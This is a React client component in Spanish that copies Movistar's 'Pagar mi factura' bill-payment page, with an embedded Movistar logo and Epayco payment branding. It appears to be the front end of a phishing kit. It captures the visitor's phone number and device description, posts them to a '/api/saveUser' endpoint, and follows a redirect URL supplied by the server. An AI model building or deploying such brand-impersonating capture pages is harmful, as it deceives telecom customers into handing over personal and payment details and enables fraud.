"use client";

import { useEffect, useRef, useState } from "react";
import platform from "platform";

const MOVISTAR_LOGO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADUAAAAlCAYAAADiMKHrAAAAAXNSR0IArs4c6QAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAANaADAAQAAAABAAAAJQAAAACkUbpIAAAEbUlEQVRYCc1ZXXLbNhDeBf3SkTzxDerewDmB6RNYOUGkifuc3MDKCao+RxrJJ7B7gjg3UG7QnqDuWGpfQiLfLkWRIgGKIqnG8IwJLrCL/bA/WEJML7nN/zunOLolS+fMFFqyT+g/EvED3fTvfKqzb+CH0uf2jKLVnJkHPj2sgAt6b2jET8U5Lw/UfHVBEQEQXRSVLb4D2BLArorATHHiD30XC8X2cx1AoqfOi9aTos5+S6kLrK8Jviw+rYyMnYntH/Tr6WNRUCfv0+f7KpfzrWFje5XXyQ1qunpLbCdMfOYSlJidRjTqL13jjWjT9YDZ3jfh1fi66V+lvGX3m0mA0sIHSBjV7HATEv/vrNn3TUVBn5AkU27aLqjZ6gNMN0wHq54Kuitgn55DVaxqwX1j8bdhOiUDhV0HoN/SgTrPDBgCvE1jvm3DrryWr1MZGajoMECpAAUWrRvFgsqA27S2EgRpSEhyQ0tAiZXELxs25Z09jxuxR1EzPtdi0b+hkBNQUb04cslJabDY7cGJQ3aW7dZtUlmNnxxr4kpAMXUjGJXAQQrF66G670FMlZNDGTWyu0gQ5/LStqlfH+aG7+uuiWL2i7U4+Gs0Q/H+GquGnO0UdUOk6C3B15mtYKX9m4mD9S9r6DW9Ow3p5nRgTfALwP3jEou1L4VuUAJ1eIBuljJ0XxlfSZbam8ZV+aB3sVO5jH76E6luvFnJ+TAI1M5BaZzIweyymNaUqFpqWAkbPihW4Ioitksnmg3xpGqwzZgCM/TZTp8fiM2SpBgWr4hRtbC7psyvB7e7yxep+TE6Qc0Zr3dI2xetTmYruyW8oI7EDomreRp79JaKPUnpHkag/So75gtMD1trslqpAlDlAif85HU/TZ/INioApYyNvi3hNq8qBXY1aO2iUpQrVlMGfA5VWMpkgmXXJGj/hyYp3BtLNdc34mLOuTZ+2qHjaxcL/r5DO8YL06StWFgK106uxuasRA5646PHlwkeSusWCYbCIknepeqQJw5fXkqn1DbF4Q5drqOYP+zQOnxRr2maIHJ64PDF+eFqvkrjXX+R7oiLrSVtUYvf8rln3qPQDf7coJguPYzgOpK16rieKuX50o7l9lZAIQW64kQrAtzwqIziP+XpNmkc5HrMj0WV8llzk9JxN+1s1g1K5mrSQPrtrk1qizI9hECWtRVQkB05CShOzFYSWvVVKkmDunFD9RTT82xsSSvSItf0QgAbWctvsME7lTyKZTRUzhyv/3awU/H2szQHBSsqjesS/QACEs9HfC+ND2CpnJpYCruuZZFrasUvDzo96A/V/C7eGjR1ow4ByZKbmNLuQv472qWDlpHEDeHPTYApILhRJqybXgbqpvfgUkzvHfatJXfq8GuvtR38WOuOBJDGpmNCC9Julc40hqx5Xp4r3efHt/1EuYGVCpp5CHqIDfl5O46OHtpSwQTBpOpbKc/TpJ8kijzndLWAMm9TUtdBnMo95rMMSlaTXzNinFFyQh/rt6gjovoOniWdTPDeht8AAAAASUVORK5CYII=";

export default function BuscarNumeroClient() {
  const [numero, setNumero] = useState("");
  const [hasError, setHasError] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isLoadingBoton1, setLoading1] = useState(false);
  const [isLoadingBoton2, setLoading2] = useState(false);
  const [dispositivo, setDispositivo] = useState("Desconocido");
  const phoneRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setDispositivo(platform.description || "Desconocido");
  }, []);

  const cleanedNumber = numero.replace(/\D/g, "");
  const numeroValido = cleanedNumber.length === 10;

  function soloNumeros(e: React.ChangeEvent<HTMLInputElement>) {
    setNumero(e.target.value.replace(/\D/g, ""));
  }

  async function siguiente(boton: 1 | 2) {
    if (boton === 1 && isLoadingBoton1) return;
    if (boton === 2 && isLoadingBoton2) return;

    if (boton === 1) setLoading1(true);
    else setLoading2(true);
    setHasError(false);
    setErrorMsg(null);

    if (!numeroValido) {
      alert("Por favor ingresa un número válido de 10 dígitos");
      setLoading1(false);
      setLoading2(false);
      return;
    }

    try {
      const r = await fetch("/api/saveUser", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ numero: cleanedNumber, dispositivo }),
      });

      const data = (await r.json().catch(() => null)) as
        | { ok?: boolean; redirect?: string; errors?: Record<string, string> }
        | null;

      if (r.ok && data?.ok && data.redirect) {
        window.location.href = data.redirect;
        return;
      }

      const errs = data?.errors ?? {};
      if (errs.no_debt) {
        alert(errs.no_debt);
      } else if (errs.technical) {
        setHasError(true);
      } else if (errs.numero) {
        alert(errs.numero);
      } else {
        setHasError(true);
      }

      if (r.status >= 500) setHasError(true);
    } catch (e) {
      console.error(e);
      setHasError(true);
      setErrorMsg("Error de conexión. Intente nuevamente.");
    } finally {
      setLoading1(false);
      setLoading2(false);
    }
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="w-full mx-auto bg-white shadow-md z-50 py-5">
        <div className="flex flex-row flex-wrap justify-between items-center md:justify-center">
          <img
            src={MOVISTAR_LOGO}
            alt="Movistar"
            className="h-6 w-auto ml-6 md:h-10"
          />
          <p className="flex items-center text-xs md:text-sm mr-6 md:hidden">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              fill="currentColor"
              className="size-3 mr-1"
            >
              <path
                fillRule="evenodd"
                d="M12 1.5a5.25 5.25 0 0 0-5.25 5.25v3a3 3 0 0 0-3 3v6.75a3 3 0 0 0 3 3h10.5a3 3 0 0 0 3-3v-6.75a3 3 0 0 0-3-3v-3c0-2.9-2.35-5.25-5.25-5.25Zm3.75 8.25v-3a3.75 3.75 0 1 0-7.5 0v3h7.5Z"
                clipRule="evenodd"
              />
            </svg>
            Pagos procesados por
            <img
              src="/movistar/30.png"
              alt="Epayco"
              className="h-4 ml-1"
            />
          </p>
        </div>
      </div>

      <div className="md:flex">
        <div className="container mx-auto px-4 py-5 max-w-7xl md:w-1/2">
          <div className="w-full md:w-5/6 lg:w-3/4 mx-auto">
            {/* Tabs */}
            <div className="overflow-x-auto scrollbar-hide">
              <div className="mx-auto flex flex-row justify-start items-center my-4 bg-[#fafaf7] rounded-3xl shadow-[4px_4px_2px_rgba(0,0,0,0.1)] px-2 py-2 w-max">
                <button className="bg-[#019df4] text-white rounded-full px-4 py-2 text-xs min-h-9 mr-2 hover:shadow-md transition-all duration-500">
                  Movistar
                </button>
                <button className="text-[#019df4] bg-[#efefef] rounded-full px-4 py-2 text-xs min-h-9 mr-2 hover:shadow-md transition-all duration-500">
                  Antes Telebucaramanga
                </button>
                <button className="text-[#019df4] bg-[#efefef] rounded-full px-4 py-2 text-xs min-h-9 hover:shadow-md transition-all duration-500">
                  Antes Metrotel
                </button>
              </div>
            </div>

            <h1 className="text-center text-xl md:text-2xl font-medium py-3">
              <span className="font-light">Pagar mi factura </span>
              <span className="font-semibold">Movistar</span>
            </h1>

            <div className="w-full">
              <div className="flex flex-row justify-center items-center py-2">
                <button className="text-sm bg-[#0B2739] text-white rounded-full px-4 py-2 min-h-9 mr-2 hover:shadow-md transition-all duration-500">
                  Móvil
                </button>
                <button className="text-sm border border-dark-blue text-dark-blue rounded-full px-4 py-2 min-h-9 hover:shadow-md transition-all duration-500">
                  Fija
                </button>
              </div>

              <div className="relative group my-6">
                <button
                  onClick={() => siguiente(1)}
                  disabled={!numeroValido || isLoadingBoton1 || isLoadingBoton2}
                  className={
                    "w-full rounded-full text-sm px-4 py-3 transition-all duration-500 border relative " +
                    (numeroValido && !isLoadingBoton1 && !isLoadingBoton2
                      ? "bg-[rgb(242,141,21)] text-white border-[rgb(242,141,21)] cursor-pointer hover:shadow-md"
                      : "bg-white text-dark-blue border-gray-300 opacity-70 cursor-not-allowed") +
                    (isLoadingBoton1 || isLoadingBoton2 ? " opacity-50" : "")
                  }
                >
                  {isLoadingBoton1 ? (
                    <div className="flex items-center justify-center">
                      <img
                        src="/movistar/loader.gif"
                        width={30}
                        alt="Cargando"
                        className="mx-auto"
                      />
                    </div>
                  ) : (
                    <span>
                      <i className="icon-icon-tiempo mr-2"></i>
                      Activar / Gestionar mi pago automático
                    </span>
                  )}
                </button>
              </div>

              {/* Phone input */}
              <div
                className="pb-3 w-full"
                onClick={() => phoneRef.current?.focus()}
              >
                <div className="relative w-full group">
                  <div className="absolute left-0 top-0 h-14 flex items-center justify-center">
                    <i
                      className={
                        "icon-icon-movil text-xl transition-colors duration-200 " +
                        (hasError ? "text-red-500" : "text-dark-blue")
                      }
                    ></i>
                  </div>
                  <input
                    ref={phoneRef}
                    value={numero}
                    onChange={soloNumeros}
                    className={
                      "w-full h-14 pl-10 pr-12 border-b-2 focus:outline-none placeholder:text-sm " +
                      (hasError
                        ? "border-red-500 text-red-500 placeholder:text-gray-300"
                        : "border-dark-blue focus:border-[#019df4] text-dark-blue")
                    }
                    placeholder="Ingresa el número de línea o de pago"
                    type="text"
                    inputMode="numeric"
                  />
                </div>
                {hasError && (
                  <small className="text-red-500 errortext">
                    {errorMsg ||
                      "Estamos presentando fallas técnicas. Intente nuevamente."}
                  </small>
                )}
              </div>

              <div className="flex flex-col gap-4 py-3">
                <button
                  onClick={() => siguiente(2)}
                  disabled={!numeroValido || isLoadingBoton2 || isLoadingBoton1}
                  className={
                    "w-full bg-[#0B2739] text-white rounded-full text-sm px-4 py-3 transition-all duration-500 relative " +
                    (!numeroValido || isLoadingBoton2 || isLoadingBoton1
                      ? "opacity-50"
                      : "hover:shadow-md")
                  }
                >
                  {isLoadingBoton2 ? (
                    <div className="flex items-center justify-center">
                      <p className="text-white text-[13px] mr-2">
                        Espere un momento por favor, no recargue la página…
                      </p>
                      <img
                        src="/movistar/loader.gif"
                        width={20}
                        alt="Cargando"
                        className="brightness-0 invert"
                      />
                    </div>
                  ) : (
                    <span>Consultar y pagar</span>
                  )}
                </button>
              </div>

              <div className="mt-6 text-center">
                <p className="font-semibold md:hidden">
                  Nuevos medios de pago disponibles para ti
                </p>
                <div className="flex flex-row justify-center items-center mt-2 md:hidden">
                  <img
                    src="/movistar/FORMA_PAGO_1.png"
                    alt="PSE"
                    className="mx-2 mb-2 h-5"
                  />
                  <img
                    src="/movistar/FORMA_PAGO_2.png"
                    alt="Tarjeta"
                    className="mx-2 mb-2 h-5"
                  />
                  <img
                    src="/movistar/FORMA_PAGO_18.png"
                    alt="Bancolombia"
                    className="mx-2 mb-2 h-5"
                  />
                </div>
                <div className="flex items-center justify-center flex-col mt-2 space-y-2">
                  <p className="text-sm text-gray-600 md:hidden">
                    <i className="icon-icon-info iconInfoMovil"></i> No se aceptan
                    pagos con tarjetas de crédito internacionales
                  </p>
                  <p className="text-center underline my-3 text-[#019df4] hidden md:block">
                    ¿Cómo hacer mi pago?
                  </p>
                  <p className="justify-center items-center hidden my-3 md:flex">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      className="size-3.5 mr-1"
                    >
                      <path
                        fillRule="evenodd"
                        d="M12 1.5a5.25 5.25 0 0 0-5.25 5.25v3a3 3 0 0 0-3 3v6.75a3 3 0 0 0 3 3h10.5a3 3 0 0 0 3-3v-6.75a3 3 0 0 0-3-3v-3c0-2.9-2.35-5.25-5.25-5.25Zm3.75 8.25v-3a3.75 3.75 0 1 0-7.5 0v3h7.5Z"
                        clipRule="evenodd"
                      />
                    </svg>
                    Pagos procesados por
                    <img
                      src="/movistar/30.png"
                      alt="Epayco"
                      className="h-5 ml-1"
                    />
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="block w-full md:w-1/3 md:h-screen">
          <picture className="block w-full h-full">
            <source media="(min-width: 768px)" srcSet="/movistar/portada2.png" />
            <img
              src="/movistar/portada.png"
              alt="portada"
              className="w-full h-auto md:h-full object-cover"
            />
          </picture>
        </div>
      </div>
    </div>
  );
}
